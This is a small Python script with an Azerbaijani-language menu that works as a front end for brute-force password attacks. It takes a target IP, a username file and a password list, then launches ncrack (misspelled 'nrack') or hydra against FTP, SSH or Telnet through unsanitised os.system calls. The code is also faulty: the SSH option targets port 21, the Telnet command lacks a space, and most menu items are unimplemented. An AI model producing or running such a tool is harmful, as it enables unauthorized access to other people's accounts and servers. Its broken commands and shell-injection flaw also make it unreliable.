#!/usr/bin/env python

import os 

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Brute_Force")
print (""" 
     (((:  Xos geldin HACKER :)))
     
1) FTP
2) SSH
3) Telnet
4) HTTP
5) SMB
6) ROP
7) SIP
8) Redis
9) VNC     
10) PostgreSQL
11) MySQL    

""")

sayino = input("Sayini Daxil Et: ")
hedefIP = input("Hedef IP Daxil Et: ")
istifadeciadi = input("Istifadeci Adi Fayl Yolu: ")
sifreler = input("Sifrelerin Oldugu Faylin Yolu: ")

if(sayino=="1"):
        os.system("nrack -p 21 -u " + istifadeciadi + " -P " + sifreler + " " + hedefIP)
elif(sayino=="2"):
        os.system("nrack -p 21 -u " + istifadeciadi + " -P " + sifreler + " " + hedefIP)
elif(sayino=="3"):
        os.system("hydra -L " + istifadeciadi + " -P " + sifreler + " " + hedefIP + "telnet")
else:
        print(" ): DIGER SECIMLER MUVEQQETI OLARAQ ISLEMIR TEZLIKLE BERPA OLUNACAQ :( ")
